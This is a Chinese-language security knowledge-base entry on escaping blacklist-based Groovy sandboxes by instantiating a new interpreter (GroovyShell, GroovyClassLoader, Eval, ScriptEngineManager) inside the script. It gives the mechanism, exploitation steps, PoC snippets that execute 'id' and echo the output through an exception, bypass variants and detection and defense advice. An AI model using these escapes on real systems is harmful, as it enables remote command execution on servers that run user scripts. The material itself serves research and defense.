---
id: binary-pwn-sandbox-escape-groovy-interpreter-reinstantiation
title: Groovy 黑名单沙箱解释器逃逸：在脚本内新建解释器
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: groovy-sandbox-interpreter-escape
aliases:
- GroovyShell 沙箱逃逸
- GroovyClassLoader 绕过沙箱
- Eval.me 沙箱绕过
- Groovy AST 沙箱逃逸
tags:
- groovy
- sandbox-escape
- script-engine
- ast
- blacklist
- jvm
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:42:17+08:00'
  notes: 已对照原文与截图核对：SandboxTransformer/Checker/GroovyInterceptor 原理、GroovyShell/GroovyClassLoader/Eval/ScriptEngineManager 四个重入点、Syncope 4.1.2 ConnId 黑名单缺失约100条签名的案例与单请求 RCE 均一致。原文未给 groovy-sandbox 版本区间，affected_versions 留空恰当。PoC 未独立执行。
---

## 一句话结论

黑名单式 Groovy 沙箱靠 AST 改写给“直接书写的调用”织入检查点；只要脚本能新建一个使用默认编译器的 `GroovyShell`、`GroovyClassLoader`、`Eval` 或 JSR-223 `ScriptEngine`，把真正的 payload 作为字符串交给它，内层代码就会在没有 `Checker` 检查点的环境中编译执行，从而绕过沙箱拿到命令执行。

## 原理

- Groovy 沙箱（groovy-sandbox、Jenkins lib-groovy-sandbox 等）在编译期用 `CompilationCustomizer`（`SandboxTransformer`）遍历 AST，把 `Runtime.getRuntime()`、`obj.method()`、`new X()` 改写成 `Checker.checkedStaticCall`、`Checker.checkedCall`、`Checker.preCheckedConstructorCall`。
- 检查点在编译产物里：只有“由带 `SandboxTransformer` 的编译器编译”的脚本才会调用 `Checker`。运行期 `GroovyInterceptor` 链通过 ThreadLocal 注册，但它只被 `Checker` 调用；如果代码路径根本不经过 `Checker`，拦截器等于不存在。
- 新 `GroovyShell()` 默认使用 Groovy 的默认 `CompilerConfiguration`，不含 `SandboxTransformer`。它 `evaluate` 的字符串是一段全新的源码，由默认编译器重新编译，字节码中不会出现任何 `Checker.checked*`。
- 同理：`GroovyClassLoader.parseClass` 直接编译类源码；`groovy.util.Eval.me` 内部就是新建 `GroovyShell`；`ScriptEngineManager().getEngineByName("groovy")` 走 JSR-223 独立入口。
- 外层脚本中“新建解释器”这个动作本身仍会被改写和检查，能否成功只取决于黑名单是否列全了这些入口及其构造器重载。

## 触发条件

- 应用把用户可控的 Groovy 脚本交给黑名单式沙箱执行（Jenkins Pipeline、规则引擎、工作流、身份管理产品等）。
- 运行时 classpath 中存在 Groovy（`groovy.lang.GroovyShell`、`GroovyClassLoader`、`groovy.util.Eval`、`javax.script.ScriptEngineManager` 至少一个）。
- 沙箱黑名单没有覆盖上述入口，或只覆盖了部分重载/路径。
- 脚本执行权限足够（通常只要能让应用编译执行脚本即可）。

## 利用步骤

1. 确认脚本入口与沙箱类型：提交 `1+1` 或 `println(1)` 验证脚本会被执行。
2. 枚举可用的解释器重入点：`GroovyShell`、`GroovyClassLoader`、`Eval`、`ScriptEngineManager`。
3. 把真正的命令执行代码写成字符串，交给新解释器编译执行。
4. 用异常消息、返回值或输出流把命令结果带回响应；例如执行 `id` 后把输出拼进 `RuntimeException`。
5. 若某个入口被黑名单拦截，换另一个入口或换构造方式（反射、已有实例的方法链）。

## PoC

```groovy
// 1. GroovyShell：默认编译器，无 SandboxTransformer
new groovy.lang.GroovyShell().evaluate('def p = Runtime.getRuntime().exec("id"); p.waitFor(); throw new RuntimeException("RCE:" + p.getInputStream().text)')

// 2. GroovyClassLoader：直接编译类源码
new groovy.lang.GroovyClassLoader().parseClass('class E { def run() { Runtime.getRuntime().exec("id") } }')

// 3. Eval：内部新建 GroovyShell
groovy.util.Eval.me('Runtime.getRuntime().exec("id")')

// 4. JSR-223：独立脚本引擎入口
new javax.script.ScriptEngineManager().getEngineByName('groovy')
    .eval('Runtime.getRuntime().exec("id")')
```

```groovy
// 带回显的完整写法（外层脚本只负责创建解释器）
def p = new groovy.lang.GroovyShell().evaluate(
  'def p = Runtime.getRuntime().exec("id"); p.waitFor(); p.getInputStream().text')
throw new RuntimeException("RCE:" + p)
```

说明：以上为结构复现，实际命令与回显方式需按目标环境调整；未在目标环境执行。

## 变体与关联

- 变体：黑名单只覆盖 `GroovyShell` 的部分构造器时，改用其他重载或反射构造；也可用已有 `GroovyShell` 实例的 `evaluate`/`parse` 方法。
- 变体：不同产品各自维护黑名单，容易出现覆盖不一致。案例中宿主应用的黑名单有 253 行，而连接器框架自带黑名单只有约 100 行，缺失全部 `GroovyShell` 构造器、`GroovyClassLoader`、`Eval`、`ScriptEngineManager`/`ScriptEngine.eval`，于是同一条路径被打开。
- 关联：[[binary-pwn-sandbox-escape-groovy-invokerhelper-indirect-dispatch]]（黑名单补齐解释器入口后的下一层绕过）；[[binary-pwn-sandbox-escape-groovy-reflection-blacklist-gaps]]（黑名单覆盖不足时的低成本探测）。
- 关联：[[web-java-component-syncope-connector-script-rce]]（该手法在 Apache Syncope 连接器脚本上的完整入口与利用）。

## 检测与防御

- 检测：脚本中出现 `GroovyShell`、`GroovyClassLoader`、`Eval.me`、`ScriptEngineManager`、`getEngineByName`、`evaluate(`、`parseClass(` 等组合；尤其在业务脚本本不应创建解释器时。
- 检测：脚本异常中出现 `RCE:` 等自定义回显前缀，或短时间大量脚本编译/类加载。
- 防御：黑名单必须覆盖所有“创建新解释器”的入口及其构造器重载，包括反射可达路径；缺一个即等于没防。
- 防御：不要把黑名单沙箱当作安全边界。对不可信脚本使用独立 JVM/进程/容器隔离，限制文件系统、网络与子进程；能关闭脚本功能的业务直接关闭。
- 防御：脚本提交与执行加审计、版本留痕和人工审核；对脚本引擎的类加载与进程创建做运行时监控。
